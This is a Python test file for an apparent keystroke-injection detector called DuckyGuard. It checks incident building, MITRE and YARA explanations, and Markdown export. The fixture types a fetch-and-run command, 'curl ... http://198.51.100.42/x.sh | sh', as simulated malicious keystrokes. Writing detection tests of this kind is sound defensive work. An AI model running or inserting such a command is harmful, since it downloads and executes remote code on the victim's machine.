"""Incident building, explanation text and Markdown export."""

import os
import stat

from duckyguard.detector import KeyEvent, KeystrokeAnomalyDetector
from duckyguard.incidents import analyze_text, build_incident, export_incident, finalize_incident, render_markdown


def blocked_verdict():
    det = KeystrokeAnomalyDetector()
    t = 0.0
    for ch in "curl -sL http://198.51.100.42/x.sh | sh\n" * 2:
        v = det.observe(KeyEvent(timestamp=t, char=ch, hold_time=0.003))
        if v.block:
            return v
        t += 0.012
    raise AssertionError


def test_incident_markdown_has_everything(tmp_path):
    v = blocked_verdict()
    inc = build_incident(v.as_dict(), {"product": "Flipper Zero", "manufacturer": "STM", "vendor_hex": "0483",
                                       "product_hex": "5740", "transport": "USB", "serial": "", "vendor_note": "x"},
                         "curl -s", simulated=False, started_at=1_800_000_000.0)
    finalize_incident(inc, 'L http://198.51.100.42/x.sh | sh\n', 30, ended_at=1_800_000_002.0)
    md = render_markdown(inc, "2.0.0")
    assert "blocked" in inc["explanation"]
    assert "T1200" in md and "T1105" in md
    assert "198.51.100.42" in md and "rule DuckyGuard_HID_payload" in md
    assert "not proof" in md
    p = export_incident(inc, str(tmp_path), "2.0.0")
    assert os.path.exists(p) and stat.S_IMODE(os.stat(p).st_mode) == 0o600


def test_no_yara_without_indicators():
    an = analyze_text("hello world this is a plain sentence")
    assert an["yara"] is None
    assert [m["id"] for m in an["mitre"]] == ["T1674", "T1200"]
    v = blocked_verdict()
    inc = finalize_incident(build_incident(v.as_dict(), None, "hello"), " world", 6)
    md = render_markdown(inc, "2.0.0")
    assert "No YARA rule" in md
    assert "source device is unknown" in md


def test_simulated_incident_is_labelled():
    v = blocked_verdict()
    inc = finalize_incident(build_incident(v.as_dict(), None, "a", simulated=True), "b", 1)
    assert "safe test" in render_markdown(inc, "2.0.0")
    assert "(simulated)" in inc["summary"]
